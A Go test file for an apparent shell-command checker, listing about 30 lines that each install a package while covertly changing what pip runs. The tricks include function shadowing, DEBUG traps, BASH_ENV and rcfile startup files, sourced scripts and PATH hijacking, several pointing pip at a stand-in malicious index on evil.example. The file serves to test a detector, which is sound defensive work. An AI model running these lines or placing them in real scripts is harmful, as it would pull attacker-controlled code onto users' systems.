package installread

import "testing"

// Re-review of READER-SHADOW-1 round 19 (reader-rows 0c8c69a): every line installs zz-pkg and makes the shell run
// something other than the plain install the readers read. Logged; the verdict file says which must hold. Adopted in
// round 20 with the verdicts asserted: every line holds in the line reader except the coordinator's decision (a
// sourced FILE is a fact for the server and is read by alalanet-agent, TestSourcedFile*), P3-M (export -f alone) and
// zsh -o globalrcs (system files only).
func TestReview7Shadow(t *testing.T) {
	const idx = "--index-url https://evil.example/simple"
	for _, line := range []string{
		// earlier rounds
		"echo $'a\\'b'; pip() { command pip " + idx + " \"$@\"; }; pip install zz-pkg",
		"echo hi # don't\npip() { command pip " + idx + " \"$@\"; }\npip install zz-pkg",
		"cat <<EOF\ndon't\nEOF\npip() { command pip " + idx + " \"$@\"; }\npip install zz-pkg",
		"source /dev/stdin <<< 'pip() { command pip " + idx + " \"$@\"; }'; pip install zz-pkg",
		"env 'BASH_FUNC_pip%%=() { command pip " + idx + " \"$@\"; }' bash -c 'pip install zz-pkg'",
		"shopt -s expand_aliases\nalias x='pip install " + idx + "'\nx zz-pkg",
		// the coordinator's list
		"eval 'pip() { command pip " + idx + " \"$@\"; }'; pip install zz-pkg",
		"declare -f | source /dev/stdin; pip install zz-pkg",
		"export -f pip; bash -c 'pip install zz-pkg'",
		"trap 'export PIP_INDEX_URL=https://evil.example/simple' DEBUG; pip install zz-pkg",
		"trap 'PIP_INDEX_URL=https://evil.example/simple' DEBUG; pip install zz-pkg",
		"trap 'alias pip=\"pip " + idx + "\"' DEBUG; pip install zz-pkg",
		"set -T; trap 'export PIP_INDEX_URL=https://evil.example/simple' DEBUG; pip install zz-pkg",
		"PROMPT_COMMAND='pip() { :; }'; pip install zz-pkg",
		"command_not_found_handle() { command pip install " + idx + " zz-pkg; }; zz-not-a-command",
		"preexec() { export PIP_INDEX_URL=https://evil.example/simple; }; pip install zz-pkg",
		"enable -f ./x.so pip; pip install zz-pkg",
		// startup files a child shell reads, from the line's environment
		"BASH_ENV=./evil.sh bash -c 'pip install zz-pkg'",
		"env BASH_ENV=./evil.sh bash -c 'pip install zz-pkg'",
		"ZDOTDIR=./evil zsh -c 'pip install zz-pkg'",
		"ENV=./evil.sh sh -i -c 'pip install zz-pkg'",
		"bash --rcfile ./evil.sh -i -c 'pip install zz-pkg'",
		// a file the line sources
		"source ./evil.sh && pip install zz-pkg",
		". ./evil.sh; pip install zz-pkg",
		"source .venv/bin/activate && pip install zz-pkg",
		"HOME=./evil zsh -c 'pip install zz-pkg'",
		"HOME=./evil bash -l -c 'pip install zz-pkg'",
		"env HOME=./evil zsh -c 'pip install zz-pkg'",
		"bash --init-file ./evil.sh -i -c 'pip install zz-pkg'",
		"zsh -o globalrcs -c 'pip install zz-pkg'",
		// PATH
		"PATH=./bin:/usr/bin pip install zz-pkg",
		"export PATH=./bin:/usr/bin; pip install zz-pkg",
	} {
		tg, un, _, subst := ParseLine(line)
		ex := HookExtra(line, tg, un, subst)
		hold := len(un) > 0 || len(ex) > 0
		t.Logf("hold=%-5v %-100q unread %v extra %v", hold, line, un, ex)
		if want := !review7Silent[line]; hold != want {
			t.Errorf("%q: hold %v, want %v", line, hold, want)
		}
	}
}

// review7Silent: the lines of TestReview7Shadow the line reader does not hold.
var review7Silent = map[string]bool{
	"export -f pip; bash -c 'pip install zz-pkg'":     true, // P3-M: re-exports a function the line does not define
	"source ./evil.sh && pip install zz-pkg":          true, // a fact for the server; alalanet-agent reads the file
	". ./evil.sh; pip install zz-pkg":                 true,
	"source .venv/bin/activate && pip install zz-pkg": true,
	"zsh -o globalrcs -c 'pip install zz-pkg'":        true, // the system's files only
}
